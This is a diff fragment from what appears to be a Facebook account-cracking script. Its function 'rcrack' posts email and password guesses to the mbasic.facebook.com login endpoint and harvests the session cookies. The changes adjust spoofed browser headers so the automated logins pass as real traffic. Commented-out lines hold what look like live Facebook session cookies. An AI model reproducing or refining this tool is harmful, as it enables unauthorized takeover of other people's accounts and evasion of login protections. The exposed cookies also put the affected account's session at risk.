@@ -615,13 +615,14 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb ={
+            header_freefb = {
     'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=kmmjZcQiTtospSW677oQ0Alf; sb=kmmjZW7gW9ogVGpN9dskVM8v; locale=en_GB; vpd=v1%3B664x360x3; m_pixel_ratio=3; wd=360x664; fr=0JmucsMqNr3K8lAfF.AWUpiPRNwxvIMRzV5zpsLGbtdZw.Blo2mS.Nf.AAA.0.0.Blo4Zk.AWXl2Y2WjEA; c_user=100056097094641; xs=44%3AcHn3vaWsfDXpTg%3A2%3A1705215588%3A-1%3A4863; fbl_st=100435136%3BT%3A28420259; fbl_cs=AhBRKjWXufWCXZEjZa%2FZ08%2FxGE45Q00vZVBZN3dKNW04am52SWg5UE9KNQ; fbl_ci=550722896080687; m_page_voice=100056097094641',
+    # 'cookie': 'datr=kmmjZcQiTtospSW677oQ0Alf; sb=kmmjZW7gW9ogVGpN9dskVM8v; dpr=3.2983407974243164; locale=en_GB; vpd=v1%3B664x360x3; wl_cbv=v2%3Bclient_version%3A2393%3Btimestamp%3A1705348729; wd=360x664; fr=0JmucsMqNr3K8lAfF.AWXwowOOtW7ndjs2TXWTGmqD2VY.Blo2mS.Nf.AAA.0.0.Blpr_R.AWWp6B-C6Qk',
     'dpr': '3',
+    'referer': 'https://mbasic.facebook.com/?wtsid=rdr_0Q1a5fT47WlbQoRKy&refsrc=deprecated&_rdr',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
@@ -631,10 +632,11 @@ def rcrack(uid,pwx,tl):
     'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro,}
+    'user-agent': pro,
+            }
 
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
